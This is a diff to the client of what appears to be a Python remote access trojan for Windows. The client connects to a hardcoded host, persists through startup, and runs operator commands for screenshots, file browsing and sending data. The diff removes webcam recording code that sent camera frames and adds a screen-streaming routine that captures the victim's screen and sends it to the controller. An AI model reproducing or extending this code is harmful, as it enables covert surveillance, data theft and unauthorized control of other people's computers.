@@ -5,9 +5,6 @@ from winreg import *
 from io import StringIO, BytesIO
 from cryptography.fernet import Fernet
 import pkg_resources.py2_warn
-import numpy as np
-import os
-import cv2
 
 # strHost = ""
 strHost = socket.gethostbyname("s1ck")
@@ -20,6 +17,8 @@ intBuff = 1024
 
 blnMeltFile = False
 blnAddToStartup = True
+# boolean to manage stream-state
+stream_active=False
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
@@ -190,71 +189,40 @@ def screenshot():
     sendall(objPic)
 
 
-def startstream():
+def screenstream():
 
+    def thread_function():
+        global stream_active
+        stream_active=True
+        while stream_active:
+            # Take Screenshot
+            objImage = pyscreeze.screenshot()
+            # Create BytesIO Object as objBytes
+            with BytesIO() as objBytes:
+                # Save Screenshot into BytesIO Object
+                objImage.save(objBytes, format="PNG")
+                # Get BytesIO Object Data as bytes
+                objPicw = objBytes.getvalue()
 
+            sendall(objPicw)
 
-    filename = 'video.avi'
-    frames_per_second = 24.0
-    res = '720p'
+    #x = threading.Thread(target=thread_function, args=())
+    #  logging.info("Main    : before running thread")
+    # x.start()
 
-    # Set resolution for the video capture
-    # Function adapted from https://kirr.co/0l6qmh
-    def change_res(cap, width, height):
-        cap.set(3, width)
-        cap.set(4, height)
+    objImage = pyscreeze.screenshot()
+    # Create BytesIO Object as objBytes
+    with BytesIO() as objBytes:
+        # Save Screenshot into BytesIO Object
+        objImage.save(objBytes, format="PNG")
+        # Get BytesIO Object Data as bytes
+        objPicw = objBytes.getvalue()
 
-    # Standard Video Dimensions Sizes
-    STD_DIMENSIONS =  {
-        "480p": (640, 480),
-        "720p": (1280, 720),
-        "1080p": (1920, 1080),
-        "4k": (3840, 2160),
-    }
+    sendall(objPicw)
 
-
-    # grab resolution dimensions and set video capture to it.
-    def get_dims(cap, res='1080p'):
-        width, height = STD_DIMENSIONS["480p"]
-        if res in STD_DIMENSIONS:
-            width,height = STD_DIMENSIONS[res]
-        ## change the current caputre device
-        ## to the resulting resolution
-        change_res(cap, width, height)
-        return width, height
-
-    # Video Encoding, might require additional installs
-    # Types of Codes: http://www.fourcc.org/codecs.php
-    VIDEO_TYPE = {
-        'avi': cv2.VideoWriter_fourcc(*'XVID'),
-        #'mp4': cv2.VideoWriter_fourcc(*'H264'),
-        'mp4': cv2.VideoWriter_fourcc(*'XVID'),
-    }
-
-    def get_video_type(filename):
-        filename, ext = os.path.splitext(filename)
-        if ext in VIDEO_TYPE:
-          return  VIDEO_TYPE[ext]
-        return VIDEO_TYPE['avi']
-
-
-
-    cap = cv2.VideoCapture(0)
-    out = cv2.VideoWriter(filename, get_video_type(filename), 25, get_dims(cap, res))
-
-    while True:
-        ret, frame = cap.read()
-        out.write(frame)
-        cv2.imshow('frame',frame)
-        sendall(frame)
-        if cv2.waitKey(1) & 0xFF == ord('q'):
-            stopstream()
-
-def stopstream():
-    cv2.VideoCapture(0).release()
-    cv2.VideoWriter.release()
-    cv2.destroyAllWindows()
-
+def screenstream_stop():
+    global stream_active
+    stream_active=False
 
 
 
@@ -487,6 +455,10 @@ while True:
                 remove_from_startup()
             elif strData == "screen":
                 screenshot()
+            elif strData == "stream start":
+                screenstream()
+            elif strData == "stream stop":
+                screenstream_stop()
             elif strData == "filebrowser":
                 file_browser()
             elif strData[:4] == "send":
